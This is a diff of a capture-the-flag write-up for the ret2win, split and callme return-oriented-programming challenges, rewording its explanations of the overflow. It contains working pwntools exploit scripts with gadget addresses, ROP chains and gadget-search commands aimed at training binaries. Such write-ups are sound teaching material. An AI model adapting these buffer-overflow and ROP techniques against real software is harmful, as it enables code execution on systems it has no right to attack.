@@ -129,19 +129,18 @@ the following `disassamble main` :
 
 ```
 
-It looks like the `main` function calls the `pwnme` and there is where we get the input from the user. It is also possible to see in this function that they are creating a buffer with size `0x20 (32 in decimal)` and then with the read function they ask the user some input and write it into the buffer, the problem here is that they write `0x38 bytes (56 in decimal)` from the standard input into the buffer, and obviously, `56 is greater than `32 making this a normal buffer overflow scenario.
+The program's main function calls pwnme to receive input from the user. In pwnme, a buffer of size `0x20` (32 in decimal) is created, and the read function writes the user's input into this buffer. However, there is a vulnerability since read writes `0x38` bytes (56 in decimal) from the standard input, which exceeds the buffer size. This creates a buffer overflow scenario.
 
-Also, it is in the ret2win function that we can get the flag, look at the `bin_cat_flag.txt`. This will print the contents of flag.txt to the screen.
+The ret2win function seems to hold the flag we desire, as mentioned in the `bin_cat_flag.txt` comment. It likely prints the contents of flag.txt to the screen.
 
-Now that we have the content of the `RSP register`, all it is left us to do to be able to find the offset `40 bytes`.
+To exploit this vulnerability, we need to determine the offset to overwrite the return address. Based on the provided information, the offset appears to be around `40 bytes`.
 
-In this case, as stated in the `ret2win` page you have to add an additional return because the MOVAPS issue. In Ubuntu 18.04 and up the stack might be misaligned after segfaulting.
-
-Knowing this I decided to try padding the `ROP chain` with an extra `ret`. To do that I just needed to find the correct address of a ret, a `ROP gadget`. 
+Given this information, the plan is to construct a `ROP chain` and add an extra ret instruction as `padding`. This can be achieved by finding the correct address of a ret gadget, which will help us execute the desired `ret2win` function.
 
 For that I used the tool ROPgadget : 
 
 * `ROPgadget --binary ./ret2win --ropchain`
+* `ropper --file ./ret2win --search " "`
 
 ```js
 Gadgets information
@@ -182,6 +181,7 @@ from pwn import *
 elf = ELF('ret2win')
 
 p = process(elf.path)
+# p = remote('')
 
 #Prepare the payload
 payload = b"A"*40                   #creates the junk part of the payload
@@ -190,9 +190,7 @@ payload += p64(0x40053e)            #ret address ROP chain. Necessary because we
 
 # Send the payload
 p.sendline(payload)                 #send the payload to the process
-
-r = p.recvall()              #gets all messages in the process
-print(re.search("(ROPE{.*?})",r.decode()))
+p.interactive()
 ```
 
 # SPLIT
@@ -255,11 +253,13 @@ nth paddr      vaddr      len size section type  string
 0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
 ```
 
-Now we have the the address of the /bin/cat flag.txt that would help us to get the flag. The idea is this, we want to jump to the address with the /bin/cat flag.txt and than to the address in the usefulFunction that performs the `system()` call. Executing the `/bin/cat flag.txt` command.
+To retrieve the flag, we aim to jump to the address containing `/bin/cat flag.txt` and then proceed to the usefulFunction address, which executes the s`ystem()` call to execute the command `/bin/cat flag.txt`.
 
-However, we still need to consider two things, first we do not know the offset buffer overflow value. And second, we are in a `64-bit architecture` and, as you know the stack is different in 64-bit when compared with the 3`2-bit architecture`. We need to analyze the stack for both architectures, to cover our basis.
+However, two factors need to be considered. Firstly, we don't know the exact offset value for the buffer overflow. Secondly, we are dealing with a `64-bit architecture`, which has a different stack structure compared to a `32-bit architecture`. It's essential to analyze the stack for both architectures to cover all possibilities.
 
-From the challenge description : `You can do the x86 challenge with just a 2 link chain and the x86_64 challenge with a 3 link chain.` We need a 3 link chain for 64bit because of the way values are passed to functions and how the registers are placed in the stack in each architecture. 
+According to the challenge description, for the `x86 architecture`, we only require a `2-link chain`, while for the x86_64 architecture, a 3-link chain is necessary due to differences in function parameter `passing and register` placement on the stack.
+
+In summary, we need to determine the `offset value` for the buffer overflow and construct a 3-link chain for the 64-bit architecture, taking into account the stack differences. Once executed successfully, we will be able to retrieve the flag by executing the `/bin/cat flag.txt` command. 
 
 | syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
 |---------|------|------|------|------|------|------|
@@ -290,15 +290,15 @@ And the ROP chain for 64bits is :
 
 * `ROP chain = offset_padding + pop_rdi_ret_gadget + bin_cat_command + system_addr`  
 
-Now we just need to find the buffer overflow offset.
+To find the `buffer overflow offset`, we can analyze the content of the RSP register. By `comparing` the original value of RSP before the buffer overflow with the modified value after the overflow, we can determine the offset. In this case, it seems to be `40 bytes`.
 
-Now that we have the content of the RSP register, all it is left us to do to be able to find the `offset 40`
+With the offset value determined, we can proceed to construct our exploit. We need to include the extra pop rdi; ret address for 64-bit architecture, the address for `/bin/cat flag.txt`, and the address of the `usefulFunction` that executes the injected command to retrieve the `flag`.
 
-Now that we have the offset, the extra `pop rdi ; ret address (for 64bit users)`, the address for the `/bin/cat flag.txt` and the usefulFunction system call address (which is the function that we want to `jump` to because is the one that is going to execute the previously inject command to get us th flag) we are ready to create our exploit.
+In the provided script, the `ELF functions` are used to encapsulate the information about the `split ELF file`. The script creates a process to launch the ELF file, and then the payload is constructed.
 
-this script, I start by using the ELF functions to encapsulate the information about the ELF file given as an argument, the split in our case. Then, I created a process p that is responsible to launch the ELF file in the path, which is given as an argument. After this initialization process, it is time to create the payload.  
+The payload consists of junk characters (a 40-byte random array in this case) to fill the buffer. For 64-bit architecture, the pop rdi; ret ROP gadget address is added to pass the argument `(/bin/cat flag.txt)` to the system call in a register. Finally, the address of the usefulFunction containing the system call is added to the payload.
 
-The idea is simple. We simply have to first add `the junk (a 40 bytes long random array of characters, in our case A)`. After this, because I am in a 64bit architecture I had to pass the argument `(/bin/call flag.txt)` to the system call in a register, to do so I added a `pop rdi ; ret ROPgadget address`, the one we discovered in step 5. Afterward, I had to add the system() call address in the `usefulFunction` to the payload. Making it like this:  
+Overall, the script sets up the environment, constructs the payload with the necessary addresses and values, and executes the exploit to retrieve the flag. 
 
 * `payload = 40 bytes of junk + pop_rdi_ret_address + bin_cat_address + system_call_address`
 
@@ -317,18 +317,14 @@ payload += p64(0x4007c3)            #pop rdi ; ret address ROP chain. Necessary 
 payload += p64(0x601060)            #The /bin/cat flag.txt
 payload += p64(0x40074b)            #address to system call in usefulFunction
 
-# Send the payload
-
-print(payload)
 p.sendline(payload)                 #send the payload to the process
-
-response = p.recvall()              #gets all messages in the process
-print(re.search("(ROPE{.*?})",response.decode()))
+p.interactive()
 
 ROPE{a_placeholder_32byte_flag!}
 ```
 
 # callme
+
 For this challenge, the description tells us we have to call `callme_one(1, 2, 3), callme_two(1, 2, 3) and callme_three(1, 2, 3)`, in that order, to get the flag.
 
 From the description:  
@@ -440,7 +436,5 @@ payload = junk + get_args + callme_one + get_args + callme_two + get_args + call
 
 # Send the payload
 p.sendline(payload)                 #send the payload to the process
-
-response = p.recvall()              #gets all messages in the process
-print(re.search("(ROPE{.*?})",response.decode()))
+p.interactive()
 ```
